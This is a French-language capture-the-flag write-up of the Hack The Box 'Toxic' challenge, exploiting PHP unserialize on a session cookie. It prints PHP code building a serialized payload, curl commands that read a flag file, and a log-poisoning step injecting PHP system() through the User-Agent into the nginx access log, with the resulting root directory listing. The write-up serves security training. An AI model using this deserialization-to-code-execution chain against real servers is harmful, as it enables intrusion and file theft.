\section{Toxic}

Keywords: PHP, deserialization, LFI, log poisoning 

\subsection{Analyse}

donc si on lui passe un cookie il le deserialise

\href{https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/}{Remote
code execution through unsafe unserialize in PHP}

\begin{verbatim}
we used unserialize to create an object in the application context. As soon as
the application no longer needs this object, it is cleaned up. When this
happens, the destructor is called.
\end{verbatim}

\begin{verbatim}
<?php
class PageModel
{
    public $file;

    public function __destruct()
    {
        include($this->file);
    }
}
\end{verbatim}

include charge et execute le fichier donc on peut faire du log poisoning.


donc :
\begin{verbatim}
<?php
class PageModel
{
    public $file;
}
?>

<?php
    $page = new PageModel;
    $page->file = '/flag_w4I0X';
    print(base64_encode(serialize($page)))
?>

$ curl  http://<REDACTED>:1337 -b 'PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfdzRJMFgiO30='
HTB{f4k3_fl4g_f0r_t3st1ng}
\end{verbatim}

cela passe bien. Le seul soucis c'est que c'est dynamique. donc la question
c'est comment on peut faire un \verb+ls /+

a priori pas possible par contre la conf de \verb+ngninx+ montre le path du
fichier de log et comme notre acces à ce fichier se fait via include si on emet
une requete qui ecrit un bout de PHP qui fait un ls on a gagné.

\begin{verbatim}
/var/log/nginx/access.log

$ curl  http://<REDACTED>:1337 -b 'PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ=='
    --user-agent "<?php system('ls -l /');?>"

192.168.2.3 - 200 "GET / HTTP/1.1" "-" "TOTO"
192.168.2.3 - 200 "GET / HTTP/1.1" "-" "TOTO"
192.168.2.3 - 200 "GET / HTTP/1.1" "-" "TOTO"
192.168.2.3 - 200 "GET / HTTP/1.1" "-" "TOTO"
192.168.2.3 - 200 "GET / HTTP/1.1" "-" "TOTO"
192.168.2.3 - 200 "GET / HTTP/1.1" "-" "TOTO"
192.168.2.3 - 200 "GET / HTTP/1.1" "-" "TOTO"
192.168.2.3 - 200 "GET / HTTP/1.1" "-" "total 76
drwxr-xr-x    2 root     root          4096 Aug  9 09:01 bin
drwxr-xr-x    5 root     root           360 Dec 12 16:46 dev
-rw-------    1 root     root           179 Apr 30  2021 entrypoint.sh
drwxr-xr-x    1 root     root          4096 Dec 12 16:46 etc
-rw-r--r--    1 root     root            27 Apr 30  2021 flag_1bW7H
drwxr-xr-x    1 root     root          4096 Dec 12 15:36 home
drwxr-xr-x    1 root     root          4096 Aug  9 09:01 lib
drwxr-xr-x    5 root     root          4096 Aug  9 09:01 media
drwxr-xr-x    2 root     root          4096 Aug  9 09:01 mnt
drwxr-xr-x    2 root     root          4096 Aug  9 09:01 opt
dr-xr-xr-x  295 root     root             0 Dec 12 16:46 proc
drwx------    2 root     root          4096 Aug  9 09:01 root
drwxr-xr-x    1 root     root          4096 Dec 12 16:46 run
drwxr-xr-x    2 root     root          4096 Aug  9 09:01 sbin
drwxr-xr-x    2 root     root          4096 Aug  9 09:01 srv
dr-xr-xr-x   13 root     root             0 Dec 12 16:46 sys
drwxrwxrwt    1 root     root          4096 Dec 12 16:46 tmp
drwxr-xr-x    1 root     root          4096 Dec 12 15:36 usr
drwxr-xr-x    1 root     root          4096 Dec 12 15:36 var
drwxr-xr-x    4 root     root          4096 Dec 12 15:36 www
\end{verbatim}

